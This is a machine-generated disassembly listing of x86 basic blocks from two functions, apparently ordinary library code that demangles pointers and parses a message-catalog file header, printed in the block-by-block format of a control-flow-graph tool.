0xb029cd0:	mov	dword ptr [ebp - 0x3c], ecx
0xb029cd3:	jmp	0xb029cec
None
|
|
|
v
0xb029cec:	mov	edx, dword ptr [eax + 4]
0xb029cef:	test	edx, edx
0xb029cf1:	jg	0xb029cd8
None
|
|
|
v
0xb029c60:	and	edi, 1
0xb029c63:	jne	0xb029c6c
None
|
|
|
v
0xb029d1a:	xor	eax, eax
0xb029d1c:	jmp	0xb029ab0
None
|
|
|
v
0xb029ae0:	lea	edx, dword ptr [ebx + 0x1160]
0xb029ae6:	mov	eax, dword ptr [ebx + 0x38a8]
0xb029aec:	mov	dword ptr [ebp - 0x44], ecx
0xb029aef:	ror	eax, 9
0xb029af2:	xor	eax, dword ptr gs:[0x18]
0xb029af9:	mov	dword ptr [esp], edx
0xb029afc:	call	eax
None
|
|
|
v
0xb029b3b:	jmp	0xb029b18
None
|
|
|
v
0xb029b50:	mov	edx, dword ptr [ebp + 8]
0xb029b53:	mov	eax, ecx
0xb029b55:	mov	dword ptr [ebp - 0x3c], ecx
0xb029b58:	call	0xb029d30
None
|
|
|
v
0xb029b18:	mov	eax, dword ptr [esi + 0x10]
0xb029b1b:	mov	eax, dword ptr [eax + 8]
0xb029b1e:	test	eax, eax
0xb029b20:	jne	0xb029b40
None
|
|
|
v
0xb029c4e:	mov	eax, dword ptr [ecx + 4]
0xb029c51:	test	eax, eax
0xb029c53:	jle	0xb029cfd
None
|
|
|
v
0xb029ac0:	lea	edx, dword ptr [ebx + 0x1160]
0xb029ac6:	mov	eax, dword ptr [ebx + 0x38a0]
0xb029acc:	mov	dword ptr [esp], edx
0xb029acf:	ror	eax, 9
0xb029ad2:	xor	eax, dword ptr gs:[0x18]
0xb029ad9:	call	eax
None
|
|
|
v
0xb029ab0:	lea	esp, dword ptr [ebp - 0xc]
0xb029ab3:	pop	ebx
0xb029ab4:	pop	esi
0xb029ab5:	pop	edi
0xb029ab6:	pop	ebp
0xb029ab7:	ret	4
None
|
|
|
v
0xb029d0a:	mov	ecx, dword ptr [ebp - 0x3c]
0xb029d0d:	jmp	0xb029c59
None
|
|
|
v
0xb029c65:	mov	eax, ecx
0xb029c67:	jmp	0xb029ab0
None
|
|
|
v
0xb029cc7:	mov	eax, dword ptr [ecx + 0x10]
0xb029cca:	test	eax, eax
0xb029ccc:	je	0xb029c60
None
|
|
|
v
0xb029b74:	mov	dword ptr [esp], eax
0xb029b77:	mov	dword ptr [ebp - 0x44], eax
0xb029b7a:	call	0xb07ae80
None
|
|
|
v
0xb029b68:	mov	dword ptr [esp], edi
0xb029b6b:	call	0xb02b980
None
|
|
|
v
0xb029cd8:	mov	eax, dword ptr [esi + 0x10]
0xb029cdb:	mov	eax, dword ptr [eax + 8]
0xb029cde:	test	eax, eax
0xb029ce0:	jne	0xb029d12
None
|
|
|
v
0xb029b08:	mov	edi, dword ptr [ecx + 0x10]
0xb029b0b:	test	edi, edi
0xb029b0d:	je	0xb029ab0
None
|
|
|
v
0xb029c7a:	mov	ecx, dword ptr [ebp - 0x3c]
0xb029c7d:	mov	eax, ecx
0xb029c7f:	jmp	0xb029ab0
None
|
|
|
v
0xb029cc2:	jmp	0xb029bea
None
|
|
|
v
0xb029c59:	mov	esi, dword ptr [ecx + 8]
0xb029c5c:	test	esi, esi
0xb029c5e:	je	0xb029cc7
None
|
|
|
v
0xb029ca2:	mov	ecx, dword ptr [ebp - 0x3c]
0xb029ca5:	jmp	0xb029c4a
None
|
|
|
v
0xb029cf3:	mov	edx, dword ptr [ebp + 8]
0xb029cf6:	call	0xb029d30
None
|
|
|
v
0xb029b5d:	mov	ecx, dword ptr [ebp - 0x3c]
0xb029b60:	jmp	0xb029aa7
None
|
|
|
v
0xb029a9c:	mov	edi, dword ptr [ecx + 4]
0xb029a9f:	test	edi, edi
0xb029aa1:	jle	0xb029b50
None
|
|
|
v
0xb029a88:	mov	ecx, eax
0xb029a8a:	mov	eax, dword ptr [ebx + 0x38d8]
0xb029a90:	test	eax, eax
0xb029a92:	jne	0xb029ae0
None
|
|
|
v
0xb029ca7:	lea	edx, dword ptr [ebx + 0x1160]
0xb029cad:	mov	eax, dword ptr [ebx + 0x38a4]
0xb029cb3:	mov	dword ptr [esp], edx
0xb029cb6:	ror	eax, 9
0xb029cb9:	xor	eax, dword ptr gs:[0x18]
0xb029cc0:	call	eax
None
|
|
|
v
0xb029b2c:	mov	edx, dword ptr [eax + 4]
0xb029b2f:	test	edx, edx
0xb029b31:	jg	0xb029b18
None
|
|
|
v
0xb029bd1:	cmp	eax, 0xff
0xb029bd4:	mov	edi, eax
0xb029bd6:	je	0xb029d1a
None
|
|
|
v
0xb029b22:	add	esi, 4
0xb029b25:	mov	eax, dword ptr [esi + 0x10]
0xb029b28:	test	eax, eax
0xb029b2a:	je	0xb029b40
None
|
|
|
v
0xb029ba4:	mov	edi, eax
0xb029ba6:	lea	eax, dword ptr [ebp - 0x1c]
0xb029ba9:	mov	dword ptr [esp + 0x14], eax
0xb029bad:	lea	eax, dword ptr [ebp - 0x20]
0xb029bb0:	mov	dword ptr [esp + 0x10], eax
0xb029bb4:	lea	eax, dword ptr [ebp - 0x24]
0xb029bb7:	mov	dword ptr [esp + 0xc], eax
0xb029bbb:	lea	eax, dword ptr [ebp - 0x28]
0xb029bbe:	mov	dword ptr [esp + 8], eax
0xb029bc2:	lea	eax, dword ptr [ebp - 0x2c]
0xb029bc5:	mov	dword ptr [esp], edi
0xb029bc8:	mov	dword ptr [esp + 4], eax
0xb029bcc:	call	0xb02c2a0
None
|
|
|
v
0xb029cfd:	mov	edx, dword ptr [ebp + 8]
0xb029d00:	mov	eax, ecx
0xb029d02:	mov	dword ptr [ebp - 0x3c], ecx
0xb029d05:	call	0xb029d30
None
|
|
|
v
0xb029adb:	jmp	0xb029a29
None
|
|
|
v
0xb029cfb:	jmp	0xb029cd8
None
|
|
|
v
0xb029c84:	lea	edx, dword ptr [ebx + 0x1160]
0xb029c8a:	mov	eax, dword ptr [ebx + 0x38a8]
0xb029c90:	mov	dword ptr [ebp - 0x3c], ecx
0xb029c93:	ror	eax, 9
0xb029c96:	xor	eax, dword ptr gs:[0x18]
0xb029c9d:	mov	dword ptr [esp], edx
0xb029ca0:	call	eax
None
|
|
|
v
0xb029aa7:	mov	esi, dword ptr [ecx + 8]
0xb029aaa:	mov	eax, ecx
0xb029aac:	test	esi, esi
0xb029aae:	je	0xb029b08
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b029d30
TOTAL BLOCKS :428
0xb02a63f:	mov	eax, dword ptr [ebp - 0xc4]
0xb02a645:	test	eax, eax
0xb02a647:	je	0xb02ad17
None
|
|
|
v
0xb02a5ff:	cmp	eax, 0xff
0xb02a602:	jne	0xb02a5e8
None
|
|
|
v
0xb02a288:	mov	eax, dword ptr [ecx + 4]
0xb02a28b:	mov	esi, dword ptr [ecx]
0xb02a28d:	add	eax, edi
0xb02a28f:	jmp	0xb02a21b
None
|
|
|
v
0xb02a2a0:	cmp	byte ptr [eax + 2], 0x49
0xb02a2a4:	jne	0xb02a253
None
|
|
|
v
0xb02a921:	test	ecx, ecx
0xb02a923:	je	0xb02ad2b
None
|
|
|
v
0xb02adc3:	cmp	dl, 0x33
0xb02adc6:	je	0xb02b07d
None
|
|
|
v
0xb02ad55:	lea	esi, dword ptr [ebx - 0x4a961]
0xb02ad5b:	jmp	0xb02a253
None
|
|
|
v
0xb02a451:	test	al, al
0xb02a453:	je	0xb02a4b0
None
|
|
|
v
0xb02a127:	sub	esp, 8
0xb02a12a:	cmp	eax, 0xff
0xb02a12d:	je	0xb02a396
None
|
|
|
v
0xb02af68:	mov	edx, esi
0xb02af6a:	cmp	dl, 0x50
0xb02af6d:	jne	0xb02a323
None
|
|
|
v
0xb02ac7c:	mov	eax, dword ptr [ebp - 0xc8]
0xb02ac82:	mov	esi, dword ptr [ebp - 0xb0]
0xb02ac88:	mov	esi, dword ptr [eax + esi*4]
0xb02ac8b:	jmp	0xb02a717
None
|
|
|
v
0xb02add5:	cmp	byte ptr [eax + 0xa], 0x34
0xb02add9:	jne	0xb02a253
None
|
|
|
v
0xb02acf6:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02acfc:	jmp	0xb02a253
None
|
|
|
v
0xb029df8:	cmp	eax, 0xff
0xb029dfb:	mov	edx, eax
0xb029dfd:	je	0xb029fa7
None
|
|
|
v
0xb029f26:	mov	ecx, dword ptr [ebp - 0x94]
0xb029f2c:	bswap	edx
0xb029f2e:	mov	dword ptr [ecx + 0x14], edx
0xb029f31:	mov	edx, dword ptr [esi + 0xc]
0xb029f34:	bswap	edx
0xb029f36:	add	edx, esi
0xb029f38:	mov	dword ptr [ecx + 0x18], edx
0xb029f3b:	mov	edx, dword ptr [esi + 0x10]
0xb029f3e:	bswap	edx
0xb029f40:	add	edx, esi
0xb029f42:	mov	dword ptr [ecx + 0x1c], edx
0xb029f45:	mov	edx, dword ptr [esi + 0x14]
0xb029f48:	bswap	edx
0xb029f4a:	cmp	edx, 2
0xb029f4d:	mov	dword ptr [ecx + 0x2c], edx
0xb029f50:	jbe	0xb02a168
None
|
|
|
v
0xb02b199:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b19f:	jmp	0xb02a253
None
|
|
|
v
0xb02af3d:	cmp	al, 0x75
0xb02af3f:	je	0xb02afee
None
|
|
|
v
0xb02b405:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b40b:	jmp	0xb02a253
None
|
|
|
v
0xb02b1e2:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b1e8:	jmp	0xb02a253
None
|
|
|
v
0xb029e96:	xchg	ebx, edx
0xb029e98:	mov	eax, dword ptr [esi]
0xb029e9a:	cmp	eax, 0x950412de
0xb029e9f:	setne	dl
0xb029ea2:	cmp	eax, 0xde120495
0xb029ea7:	mov	byte ptr [ebp - 0x90], dl
0xb029ead:	jne	0xb02abd2
None
|
|
|
v
0xb02abd2:	test	dl, dl
0xb02abd4:	je	0xb029eb3
None
|
|
|
v
0xb02a6b3:	mov	eax, dword ptr [esi + 4]
0xb02a6b6:	bswap	eax
0xb02a6b8:	mov	esi, dword ptr [ebp - 0xd4]
0xb02a6be:	mov	dword ptr [esi], eax
0xb02a6c0:	mov	eax, dword ptr [ebp - 0xbc]
0xb02a6c6:	mov	dword ptr [esi + 4], eax
0xb02a6c9:	add	dword ptr [ebp - 0xc4], 1
0xb02a6d0:	cmp	dword ptr [ebp - 0xc4], 2
0xb02a6d7:	je	0xb02a784
None
|
|
|
v
0xb02ad6b:	lea	esi, dword ptr [ebx - 0x4a951]
0xb02ad71:	jmp	0xb02a253
None
|
|
|
v
0xb02b3ef:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b3f5:	jmp	0xb02a253
None
|
|
|
v
0xb02aea1:	cmp	byte ptr [ebp - 0xc4], 0
0xb02aea8:	jne	0xb02b25b
None
|
|
|
v
0xb02a96d:	test	ecx, ecx
0xb02a96f:	jne	0xb02a9c9
None
|
|
|
v
0xb02afe3:	lea	esi, dword ptr [ebx - 0x47955]
0xb02afe9:	jmp	0xb02a253
None
|
|
|
v
0xb02b351:	cmp	al, 0x58
0xb02b353:	jne	0xb02acd2
None
|
|
|
v
0xb02af2e:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02af35:	cmp	al, 0x6f
0xb02af37:	je	0xb02aff9
None
|
|
|
v
0xb02ac90:	mov	eax, dword ptr [ebp - 0xc8]
0xb02ac96:	mov	edi, dword ptr [ebp - 0xac]
0xb02ac9c:	mov	edx, dword ptr [eax + edi*4]
0xb02ac9f:	jmp	0xb02a745
None
|
|
|
v
0xb02b1a4:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b1aa:	jmp	0xb02a253
None
|
|
|
v
0xb029f6a:	mov	dword ptr [esp], eax
0xb029f6d:	call	0xb017470
None
|
|
|
v
0xb02b245:	lea	esi, dword ptr [ebx - 0x4a961]
0xb02b24b:	jmp	0xb02a253
None
|
|
|
v
0xb02aa85:	cmp	byte ptr [ebp - 0xc4], 0
0xb02aa8c:	jne	0xb02ac5d
None
|
|
|
v
0xb02b33e:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b345:	cmp	al, 0x6f
0xb02b347:	je	0xb02b390
None
|
|
|
v
0xb029fde:	mov	edx, dword ptr [ebp - 0x90]
0xb029fe4:	test	eax, eax
0xb029fe6:	je	0xb02a04f
None
|
|
|
v
0xb02b30f:	cmp	al, 0x58
0xb02b311:	jne	0xb02acd2
None
|
|
|
v
0xb02aab6:	cmp	al, 0x78
0xb02aab8:	je	0xb02acbc
None
|
|
|
v
0xb02a9b0:	mov	edx, dword ptr [ebp - 0x98]
0xb02a9b6:	add	edi, edx
0xb02a9b8:	mov	eax, dword ptr [ebp - 0xac]
0xb02a9be:	mov	ecx, dword ptr [esi]
0xb02a9c0:	test	eax, eax
0xb02a9c2:	jne	0xb02a966
None
|
|
|
v
0xb02af56:	lea	esi, dword ptr [ebx - 0x4a955]
0xb02af5c:	jmp	0xb02a253
None
|
|
|
v
0xb02a04f:	xchg	ebx, edx
0xb02a051:	mov	eax, 6
0xb02a056:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02a5fd:	bswap	eax
0xb02a5ff:	cmp	eax, 0xff
0xb02a602:	jne	0xb02a5e8
None
|
|
|
v
0xb02a5a9:	test	ecx, ecx
0xb02a5ab:	je	0xb02acd7
None
|
|
|
v
0xb029db7:	lock sub	dword ptr [ebx + 0x1184], 1
None
|
|
|
v
0xb02ae1a:	cmp	al, 0x78
0xb02ae1c:	je	0xb02b046
None
|
|
|
v
0xb02addf:	cmp	byte ptr [eax + 0xb], 0
0xb02ade3:	jne	0xb02a253
None
|
|
|
v
0xb029d6f:	lock cmpxchg	dword ptr [ebx + 0x1184], ecx
0xb029d77:	jne	0xb02b410
None
|
|
|
v
0xb02a4b2:	mov	eax, dword ptr [ebp - 0x98]
0xb02a4b8:	add	dword ptr [ebp - 0x98], 1
0xb02a4bf:	cmp	dword ptr [ebp - 0x98], 2
0xb02a4c6:	mov	dword ptr [ebp + eax*4 - 0x80], esi
0xb02a4ca:	jne	0xb02a413
None
|
|
|
v
0xb02b10f:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b116:	cmp	al, 0x6f
0xb02b118:	je	0xb02b1e2
None
|
|
|
v
0xb02af14:	cmp	byte ptr [ebp - 0xc4], 0
0xb02af1b:	jne	0xb02b00f
None
|
|
|
v
0xb02a51b:	mov	eax, dword ptr [ebp - 0xc0]
0xb02a521:	shl	eax, 4
0xb02a524:	add	eax, dword ptr [ebp - 0xbc]
0xb02a52a:	mov	dword ptr [esp], eax
0xb02a52d:	call	0xb0173f0
None
|
|
|
v
0xb02b385:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b38b:	jmp	0xb02a253
None
|
|
|
v
0xb02b0c2:	cmp	al, 0x78
0xb02b0c4:	je	0xb02b183
None
|
|
|
v
0xb02a5d3:	test	al, al
0xb02a5d5:	je	0xb02a604
None
|
|
|
v
0xb02b25b:	lea	esi, dword ptr [ebx - 0x4a951]
0xb02b261:	jmp	0xb02a253
None
|
|
|
v
0xb02b004:	lea	esi, dword ptr [ebx - 0x4a94d]
0xb02b00a:	jmp	0xb02a253
None
|
|
|
v
0xb029d99:	test	edx, edx
0xb029d9b:	mov	dword ptr [ebx + 0x1188], edx
0xb029da1:	jne	0xb029dc5
None
|
|
|
v
0xb029fc5:	jmp	0xb029dc5
None
|
|
|
v
0xb02a6b8:	mov	esi, dword ptr [ebp - 0xd4]
0xb02a6be:	mov	dword ptr [esi], eax
0xb02a6c0:	mov	eax, dword ptr [ebp - 0xbc]
0xb02a6c6:	mov	dword ptr [esi + 4], eax
0xb02a6c9:	add	dword ptr [ebp - 0xc4], 1
0xb02a6d0:	cmp	dword ptr [ebp - 0xc4], 2
0xb02a6d7:	je	0xb02a784
None
|
|
|
v
0xb02ae03:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02ae0a:	cmp	al, 0x6f
0xb02ae0c:	je	0xb02b05c
None
|
|
|
v
0xb02af8f:	cmp	byte ptr [ebp - 0xc4], 0
0xb02af96:	jne	0xb02b03b
None
|
|
|
v
0xb02b1c5:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b1cb:	jmp	0xb02a253
None
|
|
|
v
0xb02b250:	lea	esi, dword ptr [ebx - 0x4a94d]
0xb02b256:	jmp	0xb02a253
None
|
|
|
v
0xb02ae4f:	cmp	byte ptr [eax + 6], 0x53
0xb02ae53:	jne	0xb02a253
None
|
|
|
v
0xb029fa7:	mov	eax, dword ptr [ebx + 0x1188]
0xb029fad:	sub	eax, 1
0xb029fb0:	test	eax, eax
0xb029fb2:	mov	dword ptr [edi + 4], 1
0xb029fb9:	mov	dword ptr [ebx + 0x1188], eax
0xb029fbf:	je	0xb029da3
None
|
|
|
v
0xb02b39b:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b3a1:	jmp	0xb02a253
None
|
|
|
v
0xb02b0ab:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b0b2:	cmp	al, 0x6f
0xb02b0b4:	je	0xb02b20e
None
|
|
|
v
0xb02ad01:	lea	esi, dword ptr [ebx - 0x47075]
0xb02ad07:	jmp	0xb02a253
None
|
|
|
v
0xb02ae84:	cmp	dl, 0x36
0xb02ae87:	jne	0xb02a253
None
|
|
|
v
0xb02a966:	mov	edx, dword ptr [esi + 4]
0xb02a969:	bswap	ecx
0xb02a96b:	bswap	edx
0xb02a96d:	test	ecx, ecx
0xb02a96f:	jne	0xb02a9c9
None
|
|
|
v
0xb02ab22:	cmp	al, 0x75
0xb02ab24:	je	0xb02ad4a
None
|
|
|
v
0xb02a0de:	mov	eax, dword ptr [ebp - 0x94]
0xb02a0e4:	mov	dword ptr [eax + 0x38], 0
0xb02a0eb:	lea	edx, dword ptr [eax + 0x40]
0xb02a0ee:	mov	dword ptr [eax + 0x3c], 0
0xb02a0f5:	xor	eax, eax
0xb02a0f7:	mov	dword ptr [edx + eax], 0
0xb02a0fe:	add	eax, 4
0xb02a101:	cmp	eax, 0x20
0xb02a104:	jb	0xb02a0f7
None
|
|
|
v
0xb02ab3a:	lea	esi, dword ptr [ebx - 0x4a955]
0xb02ab40:	jmp	0xb02a253
None
|
|
|
v
0xb02b364:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b36a:	jmp	0xb02a253
None
|
|
|
v
0xb02a470:	cmp	eax, dword ptr [ebp - 0x9c]
0xb02a476:	jae	0xb02a757
None
|
|
|
v
0xb02af04:	cmp	byte ptr [eax + 6], 0x58
0xb02af08:	jne	0xb02a253
None
|
|
|
v
0xb02aa92:	cmp	byte ptr [ebp - 0xc0], 0
0xb02aa99:	jne	0xb02ac52
None
|
|
|
v
0xb02b126:	cmp	al, 0x78
0xb02b128:	je	0xb02b18e
None
|
|
|
v
0xb02aa49:	cmp	al, 0x75
0xb02aa4b:	je	0xb02aba6
None
|
|
|
v
0xb02b16c:	cmp	al, 0x78
0xb02b16e:	je	0xb02b199
None
|
|
|
v
0xb02af73:	xor	esi, esi
0xb02af75:	cmp	byte ptr [eax + 5], 0x54
0xb02af79:	jne	0xb02a253
None
|
|
|
v
0xb02a05d:	xchg	ebx, edx
0xb02a05f:	mov	eax, dword ptr [ebx + 0x1188]
0xb02a065:	jmp	0xb029fad
None
|
|
|
v
0xb02ad0c:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02ad12:	jmp	0xb02a253
None
|
|
|
v
0xb02ac47:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02ac4d:	jmp	0xb02a253
None
|
|
|
v
0xb02ab80:	cmp	al, 0x78
0xb02ab82:	je	0xb02acc7
None
|
|
|
v
0xb02af45:	cmp	al, 0x78
0xb02af47:	je	0xb02afd8
None
|
|
|
v
0xb02a340:	mov	eax, dword ptr [ebp - 0x94]
0xb02a346:	mov	dword ptr [eax + 0x20], 0
0xb02a34d:	mov	dword ptr [eax + 0x24], 0
0xb02a354:	mov	dword ptr [eax + 0x28], 0
0xb02a35b:	jmp	0xb02a0de
None
|
|
|
v
0xb02b025:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b02b:	jmp	0xb02a253
None
|
|
|
v
0xb02a745:	add	edx, dword ptr [ebp - 0xb0]
0xb02a74b:	cmp	dword ptr [edx + 8], -1
0xb02a74f:	setne	al
0xb02a752:	jmp	0xb02a451
None
|
|
|
v
0xb02a958:	mov	eax, dword ptr [ebp - 0xd4]
0xb02a95e:	add	esi, 4
0xb02a961:	mov	dword ptr [eax + 4], edi
0xb02a964:	jmp	0xb02a9b8
None
|
|
|
v
0xb02a238:	mov	edx, esi
0xb02a23a:	cmp	dl, 0x49
0xb02a23d:	jne	0xb02ac35
None
|
|
|
v
0xb02a035:	mov	eax, dword ptr gs:[0]
0xb02a03b:	mov	ecx, dword ptr [ebx - 0xdc]
0xb02a041:	cmp	dword ptr [eax + ecx], 4
0xb02a045:	je	0xb02a01a
None
|
|
|
v
0xb02b051:	lea	esi, dword ptr [ebx - 0x4a959]
0xb02b057:	jmp	0xb02a253
None
|
|
|
v
0xb02acbc:	lea	esi, dword ptr [ebx - 0x47955]
0xb02acc2:	jmp	0xb02a253
None
|
|
|
v
0xb02a144:	jmp	0xb029fa7
None
|
|
|
v
0xb02a330:	mov	dword ptr [esp], esi
0xb02a333:	call	0xb017470
None
|
|
|
v
0xb02a303:	mov	edx, esi
0xb02a305:	cmp	dl, 0x31
0xb02a308:	je	0xb02aa71
None
|
|
|
v
0xb02b15d:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b164:	cmp	al, 0x6f
0xb02b166:	je	0xb02b1af
None
|
|
|
v
0xb02a7aa:	mov	eax, dword ptr [ebp - 0xd8]
0xb02a7b0:	cmp	dword ptr [ebp - 0xc0], eax
0xb02a7b6:	mov	esi, dword ptr [ebp - 0xcc]
0xb02a7bc:	mov	edi, dword ptr [ebp - 0xe4]
0xb02a7c2:	jne	0xb02acd2
None
|
|
|
v
0xb02a5f3:	add	edx, 8
0xb02a5f6:	test	edi, edi
0xb02a5f8:	mov	eax, dword ptr [edx + 4]
0xb02a5fb:	je	0xb02a5ff
None
|
|
|
v
0xb02b09e:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b0a5:	jne	0xb02b219
None
|
|
|
v
0xb02a97a:	mov	eax, dword ptr [ebp - 0xa0]
0xb02a980:	add	esi, 8
0xb02a983:	mov	ecx, dword ptr [eax + edx*4]
0xb02a986:	mov	dword ptr [esp], ecx
0xb02a989:	mov	dword ptr [ebp - 0x9c], ecx
0xb02a98f:	call	0xb07ae80
None
|
|
|
v
0xb02a5e8:	mov	eax, dword ptr [esi + eax*4]
0xb02a5eb:	test	eax, eax
0xb02a5ed:	je	0xb02a791
None
|
|
|
v
0xb02aabe:	cmp	al, 0x58
0xb02aac0:	jne	0xb02acd2
None
|
|
|
v
0xb02b03b:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b041:	jmp	0xb02a253
None
|
|
|
v
0xb029eb3:	mov	dword ptr [ebp - 0xa4], 1
0xb029ebd:	mov	dword ptr [esp], 0x68
0xb029ec4:	call	0xb0173f0
None
|
|
|
v
0xb02af9c:	cmp	byte ptr [ebp - 0xc0], 0
0xb02afa3:	jne	0xb02b030
None
|
|
|
v
0xb02a455:	lea	edi, dword ptr [edx + 4]
0xb02a458:	xor	eax, eax
0xb02a45a:	jmp	0xb02a496
None
|
|
|
v
0xb02a2e3:	cmp	dl, 0x75
0xb02a2e6:	je	0xb02a2f4
None
|
|
|
v
0xb02b30b:	cmp	al, 0x78
0xb02b30d:	je	0xb02b36f
None
|
|
|
v
0xb02a784:	add	dword ptr [ebp - 0xd8], 1
0xb02a78b:	mov	dword ptr [ebp - 0x98], edi
0xb02a791:	add	dword ptr [ebp - 0xb0], 1
0xb02a798:	mov	eax, dword ptr [ebp - 0xb0]
0xb02a79e:	cmp	dword ptr [ebp - 0xb4], eax
0xb02a7a4:	ja	0xb02a596
None
|
|
|
v
0xb02b170:	cmp	al, 0x58
0xb02b172:	jne	0xb02acd2
None
|
|
|
v
0xb02af0e:	cmp	byte ptr [eax + 7], 0
0xb02af12:	jne	0xb02af61
None
|
|
|
v
0xb02af61:	xor	esi, esi
0xb02af63:	jmp	0xb02a253
None
|
|
|
v
0xb02abc7:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02abcd:	jmp	0xb02a253
None
|
|
|
v
0xb02a2f4:	movzx	esi, byte ptr [eax + 4]
0xb02a2f8:	mov	edx, esi
0xb02a2fa:	cmp	dl, 0x38
0xb02a2fd:	je	0xb02aa16
None
|
|
|
v
0xb02af89:	cmp	byte ptr [eax + 7], 0
0xb02af8d:	jne	0xb02afd1
None
|
|
|
v
0xb02b168:	cmp	al, 0x75
0xb02b16a:	je	0xb02b1a4
None
|
|
|
v
0xb02ade9:	cmp	byte ptr [ebp - 0xc4], 0
0xb02adf0:	jne	0xb02b072
None
|
|
|
v
0xb02a19f:	bswap	eax
0xb02a1a1:	test	eax, eax
0xb02a1a3:	mov	dword ptr [ebp - 0xb4], eax
0xb02a1a9:	je	0xb02a340
None
|
|
|
v
0xb02b3fa:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b400:	jmp	0xb02a253
None
|
|
|
v
0xb02a21b:	test	esi, esi
0xb02a21d:	je	0xb02a380
None
|
|
|
v
0xb02a298:	xor	esi, esi
0xb02a29a:	cmp	byte ptr [eax + 1], 0x52
0xb02a29e:	jne	0xb02a253
None
|
|
|
v
0xb029ec9:	test	eax, eax
0xb029ecb:	mov	dword ptr [ebp - 0x94], eax
0xb029ed1:	je	0xb029fa7
None
|
|
|
v
0xb02ab69:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02ab70:	cmp	al, 0x6f
0xb02ab72:	je	0xb02acf6
None
|
|
|
v
0xb029fa0:	mov	dword ptr [edi + 8], 0
0xb029fa7:	mov	eax, dword ptr [ebx + 0x1188]
0xb029fad:	sub	eax, 1
0xb029fb0:	test	eax, eax
0xb029fb2:	mov	dword ptr [edi + 4], 1
0xb029fb9:	mov	dword ptr [ebx + 0x1188], eax
0xb029fbf:	je	0xb029da3
None
|
|
|
v
0xb02a0f7:	mov	dword ptr [edx + eax], 0
0xb02a0fe:	add	eax, 4
0xb02a101:	cmp	eax, 0x20
0xb02a104:	jb	0xb02a0f7
None
|
|
|
v
0xb02a070:	mov	ecx, dword ptr [ebp - 0x94]
0xb02a076:	mov	dword ptr [ecx + 0x14], edx
0xb02a079:	mov	edx, dword ptr [esi + 0xc]
0xb02a07c:	add	edx, esi
0xb02a07e:	mov	dword ptr [ecx + 0x18], edx
0xb02a081:	mov	edx, dword ptr [esi + 0x10]
0xb02a084:	add	edx, esi
0xb02a086:	mov	dword ptr [ecx + 0x1c], edx
0xb02a089:	mov	edx, dword ptr [esi + 0x14]
0xb02a08c:	cmp	edx, 2
0xb02a08f:	mov	dword ptr [ebp - 0xb0], edx
0xb02a095:	mov	dword ptr [ecx + 0x2c], edx
0xb02a098:	ja	0xb02a150
None
|
|
|
v
0xb02aad8:	mov	edx, esi
0xb02aada:	cmp	dl, 0x36
0xb02aadd:	jne	0xb02ad76
None
|
|
|
v
0xb029f0c:	bswap	eax
0xb029f0e:	cmp	eax, 0x1ffff
0xb029f13:	ja	0xb029f68
None
|
|
|
v
0xb02a413:	mov	edi, dword ptr [ebp - 0x90]
0xb02a419:	test	edi, edi
0xb02a41b:	je	0xb02a728
None
|
|
|
v
0xb029d3d:	add	ebx, 0x1812c3
0xb029d43:	sub	esp, 0xfc
0xb029d49:	mov	dword ptr [ebp - 0x8c], edx
0xb029d4f:	mov	edx, dword ptr gs:[8]
0xb029d56:	cmp	edx, dword ptr [ebx + 0x118c]
0xb029d5c:	je	0xb029d83
None
|
|
|
v
0xb029d5e:	xor	eax, eax
0xb029d60:	mov	ecx, 1
0xb029d65:	cmp	dword ptr gs:[0xc], 0
0xb029d6d:	je	0xb029d70
None
|
|
|
v
0xb02af4d:	cmp	al, 0x58
0xb02af4f:	nop	
0xb02af50:	jne	0xb02acd2
None
|
|
|
v
0xb02ab2a:	cmp	al, 0x78
0xb02ab2c:	je	0xb02ad3f
None
|
|
|
v
0xb029f72:	mov	eax, dword ptr [ebp - 0xa4]
0xb029f78:	test	eax, eax
0xb029f7a:	je	0xb02a330
None
|
|
|
v
0xb02a09e:	mov	dword ptr [ebp - 0x98], 0
0xb02a0a8:	mov	ecx, dword ptr [ebp - 0x94]
0xb02a0ae:	test	ax, ax
0xb02a0b1:	mov	edx, dword ptr [ebp - 0x98]
0xb02a0b7:	mov	dword ptr [ecx + 0x30], edx
0xb02a0ba:	mov	edx, dword ptr [ebp - 0x90]
0xb02a0c0:	mov	dword ptr [ecx + 0x34], edx
0xb02a0c3:	jne	0xb02a180
None
|
|
|
v
0xb029ebd:	mov	dword ptr [esp], 0x68
0xb029ec4:	call	0xb0173f0
None
|
|
|
v
0xb02a540:	mov	eax, dword ptr [ebp - 0xc0]
0xb02a546:	mov	ecx, dword ptr [ebp - 0xd0]
0xb02a54c:	mov	edx, dword ptr [ebp - 0x94]
0xb02a552:	mov	dword ptr [ebp - 0xd8], 0
0xb02a55c:	shl	eax, 3
0xb02a55f:	mov	dword ptr [ebp - 0xb0], 0
0xb02a569:	mov	dword ptr [edx + 0x10], ecx
0xb02a56c:	add	ecx, eax
0xb02a56e:	add	eax, ecx
0xb02a570:	mov	dword ptr [ebp - 0xdc], ecx
0xb02a576:	mov	ecx, dword ptr [ebp - 0xcc]
0xb02a57c:	mov	dword ptr [ebp - 0x90], eax
0xb02a582:	mov	dword ptr [ebp - 0xcc], esi
